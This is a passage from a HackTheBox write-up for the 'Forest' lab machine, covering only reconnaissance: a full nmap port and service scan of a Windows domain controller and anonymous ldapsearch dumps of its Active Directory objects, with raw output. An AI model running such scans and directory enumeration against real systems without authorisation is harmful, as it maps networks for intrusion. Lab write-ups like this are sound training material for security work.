# Forest | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.1.77
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 12:24 UTC
Stats: 0:04:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.99% done; ETC: 12:31 (0:02:34 remaining)
Stats: 0:10:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.40% done; ETC: 12:34 (0:00:00 remaining)
Nmap scan report for 10.129.1.77
Host is up (0.23s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-12-29 12:42:31Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49752/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/29%Time=5FEB21B7%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/29%OT=53%CT=1%CU=35139%PV=Y%DS=2%DC=T%G=Y%TM=5FEB22
OS:D9%P=x86_64-pc-linux-gnu)SEQ(SP=10A%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=
OS:10A%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8
OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:4DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h50m44s, deviation: 4h37m09s, median: 10m43s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-12-29T04:45:11-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-29T12:45:13
|_  start_date: 2020-12-29T12:32:54

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   221.77 ms 10.10.14.1
2   221.84 ms 10.129.1.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 725.01 seconds
```
The machine is running Windows with Active Directory services.
The FQDN is FOREST.htb.local.

### 2. Enumeration
ldapsearch
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~]
└──╼ [★]$ ldapsearch -h 10.129.1.77 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
More detailed info:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~]
└──╼ [★]$ ldapsearch -h 10.129.1.77 -x -b 'DC=htb,DC=local'

# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20201229123244.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 278566
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: AgAAAAAAAAAOAAAAAAAAAIArugegK3xCjpG3jOKvTZsK8AAAAAAAAPxOm
 
creationTime: 132537187641601943
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAALB4ltxV1shXFsPNP
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=htb,DC=local
fSMORoleOwner: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=htb,DC=local
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=htb,
 DC=local
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=htb,DC=local
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=htb
 ,DC=local
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=htb,DC=local
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 htb,DC=local
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=h
 tb,DC=local
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=htb
 ,DC=local
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=htb,DC=lo
 cal
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=htb,DC=local
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=htb,DC
 =local
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=htb,DC=loc
 al
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=htb,DC=local;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=htb,DC
 =local
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=htb,DC=local
masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,C
 N=Sites,CN=Configuration,DC=htb,DC=local
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=htb,DC=local
msDS-IsDomainFor: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-
 Name,CN=Sites,CN=Configuration,DC=htb,DC=local
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: htb

# Users, htb.local
dn: CN=Users,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Users
description: Default container for upgraded user accounts
distinguishedName: CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5888
uSNChanged: 94253
showInAdvancedViewOnly: FALSE
name: Users
objectGUID:: Gu3LKJt/HkmfzqBT6ViSzQ==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Allowed RODC Password Replication Group, Users, htb.local
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,
 DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: 4GiYdDpkwE2ZJFv5fPvTaA==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Denied RODC Password Replication Group, Users, htb.local
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
member: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
member: CN=Domain Admins,CN=Users,DC=htb,DC=local
member: CN=Cert Publishers,CN=Users,DC=htb,DC=local
member: CN=Enterprise Admins,CN=Users,DC=htb,DC=local
member: CN=Schema Admins,CN=Users,DC=htb,DC=local
member: CN=Domain Controllers,CN=Users,DC=htb,DC=local
member: CN=krbtgt,CN=Users,DC=htb,DC=local
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,D
 C=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: 8R6EhZIhIE2InGczVf4kTw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Read-only Domain Controllers, Users, htb.local
dn: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local

# Enterprise Read-only Domain Controllers, Users, htb.local
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,
 DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: MRLX+dkCB0CyOISAoaA9Aw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Cloneable Domain Controllers, Users, htb.local
dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: lTtp2MRo6kSHSNxFwm3UMw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Protected Users, Users, htb.local
dn: CN=Protected Users,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: 8PGf9KxutEWLAEVX2tM33A==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Key Admins, Users, htb.local
dn: CN=Key Admins,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Key Admins
description: Members of this group can perform administrative actions on key o
 bjects within the domain.
distinguishedName: CN=Key Admins,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12450
uSNChanged: 12452
name: Key Admins
objectGUID:: u1pq2QGIOk+QlGxpV02CrQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPDgIAAA==
sAMAccountName: Key Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Enterprise Key Admins, Users, htb.local
dn: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Enterprise Key Admins
description: Members of this group can perform administrative actions on key o
 bjects within the forest.
distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12453
uSNChanged: 12455
name: Enterprise Key Admins
objectGUID:: ET8KjKx4t0WjL4z6I7fwkw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPDwIAAA==
sAMAccountName: Enterprise Key Admins
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# DnsAdmins, Users, htb.local
dn: CN=DnsAdmins,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12483
uSNChanged: 12485
name: DnsAdmins
objectGUID:: Go/XZDmn/k+6I+oOf4Rriw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# DnsUpdateProxy, Users, htb.local
dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12488
uSNChanged: 12488
name: DnsUpdateProxy
objectGUID:: lXwsDEvqikWklJPfb4OXmg==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Exchange Online-ApplicationAccount, Users, htb.local
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Exchange Online-ApplicationAccount
distinguishedName: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=lo
 cal
instanceType: 4
whenCreated: 20190919111126.0Z
whenChanged: 20190919111126.0Z
uSNCreated: 23683
uSNChanged: 23684
garbageCollPeriod: 1209600
name: Exchange Online-ApplicationAccount
objectGUID:: XB+fL+x9IUyP+k3Hd+dsSg==
userAccountControl: 546
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPYwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountType: 805306368
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 1130555651391488
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=MeetingGraphApplication-Exchange Online-ApplicationAccount,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MailboxSearchApplication-Exchange Online-ApplicationAccount,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=TeamMailboxLifecycleApplication-Exchange Online-ApplicationAc
 cou,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Mailbox Search-Exchange Online-ApplicationAccount,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=LegalHoldApplication-Exchange Online-ApplicationAccount,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=ArchiveApplication-Exchange Online-ApplicationAccount,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=UserApplication-Exchange Online-ApplicationAccount,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchRecipientDisplayType: 12
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 33554432
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}, Users, htb.local
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
sn: MSExchApproval 1f05a927-3be2-4fb9-aa03-b59fe3b56f4c
distinguishedName: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114715.0Z
displayName: Microsoft Exchange Approval Assistant
uSNCreated: 23777
uSNChanged: 24819
proxyAddresses: SMTP:SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.l
 ocal
name: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
objectGUID:: K6oBekhMR0qykSAmZwXv7Q==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPZAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=4d0d9ee8e5aa4097bfd477c844b94abf-Syste
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
msExchVersion: 1126140425011200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First 
 Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=loc
 al
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchRequireAuthToSendTo: TRUE
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMailboxGuid:: 2BTFE/z0cEGcqCyxA7V8tA==
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526913052927892047252322452711419621
msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256
 342
msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256
 342
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
msExchWhenMailboxCreated: 20190919114715.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, htb.local
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
sn: SystemMailbox bb558c35-97f1-4cb9-8ff7-d53741dc928c
distinguishedName: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114931.0Z
displayName: Microsoft Exchange
uSNCreated: 23782
uSNChanged: 24888
